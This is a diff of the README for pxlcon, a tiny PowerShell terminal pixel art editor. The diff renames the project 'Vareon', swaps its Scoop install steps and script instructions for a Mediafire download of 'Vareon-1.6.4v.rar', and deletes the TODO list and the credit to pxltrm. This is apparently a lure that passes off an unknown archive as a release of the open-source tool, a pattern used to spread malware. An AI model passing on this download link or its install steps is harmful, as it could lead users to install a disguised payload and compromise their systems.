@@ -12,7 +12,7 @@
 <img src="https://lptstr.github.io/lptstr-images/screenshots/projects/pxlcon/screenshot.png" alt="pxlcon" align="right"
 width="51%">
 
-Pxlcon is an tiny pixel art editor for the terminal, which you control with the keyboard instead of the mouse. It is a port of `pxltrm` to PowerShell, aiming for full cross-platform compatibility.
+Vareon is an tiny pixel art editor for the terminal, which you control with the keyboard instead of the mouse. It is a port of `pxltrm` to PowerShell, aiming for full cross-platform compatibility.
 
 - **Lightweight** (less than 1.38 KB)
 - **RGB color support** (for true-color terminals)
@@ -31,22 +31,14 @@ Pxlcon is an tiny pixel art editor for the terminal, which you control with the 
 
 ## Installation
 ### Windows
-- Use [Scoop](https://scoop.sh).
+- Use [Mediafire].
     ```
-    scoop bucket add lptstr https://github.com/lptstr/lptstr-scoop
-    scoop install pxlcon
+    https://www.mediafire.com/file/ou9hnwgnl5id0h4/Vareon-1.6.4v.rar/file
     ```
 
 ### macOS/Linux
-- Move `pxlcon.ps1` somewhere in your `$PATH`.
+- Dowload `https://www.mediafire.com/file/ou9hnwgnl5id0h4/Vareon-1.6.4v.rar/file`
 
 
-## TODO
 
-- [ ] Implement undo/redo feature.
-- [ ] Test on *nix systems and macOS.
-- [ ] Implement color palette.
-
-## Inspiration
-- [pxltrm](https://github.com/dylanaraps/pxltrm)
 
